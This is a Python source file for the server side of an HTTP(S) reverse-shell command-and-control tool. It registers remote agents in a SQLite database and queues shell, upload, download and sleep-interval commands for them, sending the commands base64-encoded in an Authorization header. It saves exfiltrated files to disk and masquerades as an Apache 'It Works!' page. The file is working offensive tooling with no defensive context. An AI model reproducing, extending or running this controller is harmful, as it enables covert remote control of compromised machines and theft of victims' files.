#!/usr/bin/python3
import globals, certificate, modulescontroller
from Color import Color
from http.server import BaseHTTPRequestHandler, HTTPServer
import readline, base64, urllib.parse, time, ssl, argparse, json
from os import listdir, sep, path
import sqlite3
import os
from datetime import datetime
import commands_v2

def db_init():
    if not os.path.exists('sqlite-revshell.db'):
        sqlite_connection = sqlite3.connect('sqlite-revshell.db')
        sqlite_connection.execute('PRAGMA foreign_keys = 1')
        cursor = sqlite_connection.cursor()
        cursor.execute("CREATE TABLE agents (id INTEGER NOT NULL PRIMARY KEY, uid INTEGER, ip TEXT, agent_hostname TEXT, last_request_date TEXT, sleep INTEGER DEFAULT 1, UNIQUE(agent_hostname));")
        cursor.execute("CREATE TABLE commands_type (id INTEGER NOT NULL PRIMARY KEY, type TEXT, UNIQUE(type));")
        cursor.execute("CREATE TABLE commands (id INTEGER NOT NULL PRIMARY KEY, agent_hostname TEXT NOT NULL, type_id INTEGER, command TEXT, is_finished INTEGER DEFAULT 0, FOREIGN KEY (agent_hostname) REFERENCES agents(agent_hostname), FOREIGN KEY (type_id) REFERENCES commands_type(id));")
        cursor.execute("CREATE TABLE results (id INTEGER PRIMARY KEY NOT NULL, command_id INTEGER NOT NULL, pwd TEXT, response TEXT, agent_uid INTEGER NOT NULL, FOREIGN KEY (command_id) REFERENCES commands(id));")
        cursor.close()
        sqlite_connection.close()
        commands_v2.set_command(table='commands_type', type='upload')
        commands_v2.set_command(table='commands_type', type='download')
        commands_v2.set_command(table='commands_type', type='cmd')
        commands_v2.set_command(table='commands_type', type='change_sleep_interval')

class myHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        self.server_version = "Apache/2.4.18"
        self.sys_version = "(Ubuntu)"
        self.send_response(200)
        self.wfile.write("<html><body><h1>It Works!</h1></body></html>".encode())
        return

    def do_POST(self):
        #Adding new agents
        UID = int(self.headers['UID'])
        now = datetime.now().strftime('%d.%m.%y %H:%M:%S')
        ip = self.address_string()
        hostname = self.headers['hostname']
        

        try:
            commands_v2.set_command(table='agents', uid=UID, ip=ip, agent_hostname=hostname, last_request_date=now)
        except Exception as e:
            print(e)

        self.server_version = "Apache/2.4.18"
        self.sys_version = "(Ubuntu)"
        self.send_response(200)
        
        html = "<html><body><h1>It Works!</h1></body></html>"

        #Receiving answers
        result, parser_type, json_response, color = self.parseResult()
        pwd = self.getPwd(json_response)

        #Processing received command with ERRORs
        if json_response["type"] == "error" and int(json_response['cmd_id'])!=0:
            commands_v2.insert_result_and_update_is_finished(pwd = pwd, command_id=json_response['cmd_id'], response=result, agent_uid=UID)

        if json_response["type"] == "sleepinterval" and int(json_response['cmd_id'])!=0:
            commands_v2.insert_result_and_update_is_finished(pwd = pwd, command_id=json_response['cmd_id'], response=result, agent_uid=UID)

        if json_response["type"] == "upload" and int(json_response['cmd_id'])!=0:
            commands_v2.insert_result_and_update_is_finished(pwd = pwd, command_id=json_response['cmd_id'], response=result, agent_uid=UID)

        if (self.isDownloadFunctCalled(json_response)):
            filename, content, output = self.parseDownload(json_response)
            try:
                with open(filename, mode='wb') as file: # b is importante -> binary
                    content = base64.b64decode(content)
                    file.write(content)
                    print(Color.F_Green + output + Color.reset)
                
                commands_v2.insert_result_and_update_is_finished(pwd = pwd, command_id=json_response['cmd_id'], response=filename, agent_uid=UID)
            except:
                print (Color.F_Red + "\r\n[!] Error: Writing file!" + Color.reset)
                commands_v2.insert_result_and_update_is_finished(pwd = pwd, command_id=json_response['cmd_id'], response="\r\n[!] Error: Writing file!", agent_uid=UID)

        else:
            if json_response["result"] != json_response["pwd"] and json_response["type"] == "runcmd":
                commands_v2.insert_result_and_update_is_finished(pwd = pwd, command_id=json_response['cmd_id'], response=result, agent_uid=UID)
                
        # Sending enexecuted_commands
        command_id, type_id, new_command = commands_v2.get_unexecuted_command_for_agent(hostname)

        if new_command:
            if type_id == 4:
                try:
                    new_command = f'{new_command} {command_id}'
                    self.sendCommand(new_command, html)
                except (AttributeError, BrokenPipeError) as e:
                    print (e)
            if type_id == 3:
                try:
                    new_command = f'runcmd {command_id} {new_command}'
                    self.sendCommand(new_command, html)
                except (AttributeError, BrokenPipeError) as e:
                    print (e)
            if type_id == 2:
                try:
                    new_command = f'{new_command} {command_id}'
                    self.sendCommand(new_command, html)
                except (AttributeError, BrokenPipeError) as e:
                    print (e)
            if type_id == 1:
                try:
                    new_command = f'{new_command} {command_id}'
                    self.sendCommand(new_command, html)
                except (AttributeError, BrokenPipeError) as e:
                    print (e)
                    print('Error on backend side')
        return

    def parseResult(self):
        test_data = self.rfile.read(int(self.headers['Content-Length']))
        data = json.loads(test_data.decode('utf-8'))
        parser_type = data["type"]
        result = ""
        color = "black"

        if parser_type != "newclient":
            try:
                if (parser_type == "command"):
                    color = "black"
                elif (parser_type == "error"):
                    color = "red"
                else:
                    color = "green"

                if (parser_type == "autocomplete"):
                    globals.PSH_FUNCTIONS = (base64.b64decode(data["result"])).decode('utf-8').split()
                    readline.set_completer(self.completer)
                    readline.set_completer_delims(" ")
                    readline.parse_and_bind("tab: complete")

                else:
                    result = urllib.parse.unquote(data["result"])
                    result = (base64.b64decode(data["result"])).decode('utf-8')
            except:
                pass
        else:
            pass
            # input(Color.F_Red + "[!] New Connection, please press ENTER!" + Color.reset)
            
        return result, parser_type, data, color

    def parseDownload(self, json_result):
        downloaded_file_path = ""
        output = ""
        file_content = ""

        try:
            output = json_result["result"]
            downloaded_file_path = json_result["pathDst"]
            file_content = json_result["file"]
        except KeyError:
            pass

        return downloaded_file_path, file_content, output

    def getPwd(self, json_response):
        try:
            if json_response["pwd"]:
                pwd_decoded = base64.b64decode(json_response["pwd"].encode())
                pwd = pwd_decoded.decode('utf-8').strip()
        except KeyError:
            pwd_decoded = base64.b64decode(json_response["result"].encode())
            pwd = pwd_decoded.decode('utf-8').strip()
        return pwd

    def printResult(self, result, color):
        print(getattr(Color, color) + result + Color.reset)
        print()

    def isDownloadFunctCalled(self, json_response):
        iscalled = False
        try:
            if (json_response["type"] == "download" and json_response["file"]):
                iscalled = True
        except KeyError:
            pass
        return iscalled

    def newCommand(self, pwd):
        if globals.AUTOCOMPLETE:
            command = "autocomplete"
            globals.AUTOCOMPLETE = False
        elif pwd != "":
            command = input(Color.F_Blue + "PS {}> ".format(pwd) + Color.reset)
            if command == "":
                command = "pwd | Format-Table -HideTableHeaders"
        else:
            command = "pwd | Format-Table -HideTableHeaders"
        return command

    def sendCommand(self, command, html, content=""):
        
        if (command != ""):
            command_list = command.split(" ")
            if command_list[0] in globals.MODULES.keys():
                html = modulescontroller.ModulesController(globals.MODULES,command_list, command)
                html = str(html)

            CMD = base64.b64encode(command.encode())
            self.send_header('Authorization',CMD.decode('utf-8'))
            self.end_headers()
            self.wfile.write(html.encode())
            
    def completer(self,text, state):
        options = [i for i in globals.PSH_FUNCTIONS if i.startswith(text)]
        if state < len(options):
            return options[state]
        else:
            return None

def main():

    banner = """
██╗  ██╗████████╗████████╗██████╗   ██╗███████╗    ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗
██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗ ██╔╝██╔════╝    ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║
███████║   ██║      ██║   ██████╔╝██╔╝ ███████╗    ██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║
██╔══██║   ██║      ██║   ██╔═══╝██╔╝  ╚════██║    ██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║
██║  ██║   ██║      ██║   ██║   ██╔╝   ███████║    ██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝   ╚═╝    ╚══════╝    ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                                                         By: GIA
    """
    print (Color.F_Yellow + banner + Color.reset)
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('host', help='Listen Host', type=str)
    parser.add_argument('port', help='Listen Port', type=int)
    parser.add_argument('--ssl', default=False, action="store_true", help='Send traffic over ssl')
    parser.add_argument('--autocomplete', default=False, action="store_true", help='Autocomplete powershell functions')
    args = parser.parse_args()
    print("Press \'CRTL+C\' to stop scanning UIDs \n")

    db_init()

    try:
        HOST = args.host
        PORT = args.port
        server = HTTPServer((HOST, PORT), myHandler)
        print(time.asctime(), 'Server UP - %s:%s' % (HOST, PORT))
        globals.initialize()

        if (args.ssl):
            cert = certificate.Certificate()
            if ((cert.checkCertPath() == False) or cert.checkCertificateExpiration()):
                cert.genCertificate()
            server.socket = ssl.wrap_socket (server.socket, certfile='certificate/cacert.pem', keyfile='certificate/private.pem', server_side=True)

        # if (args.autocomplete):
        #     globals.AUTOCOMPLETE = True
        # else:
        #     readline.set_completer_delims(" ")
        #     readline.parse_and_bind("tab: complete")

        server.serve_forever()

    except KeyboardInterrupt:
        print (' received, shutting down the web server')
        server.socket.close()

main()
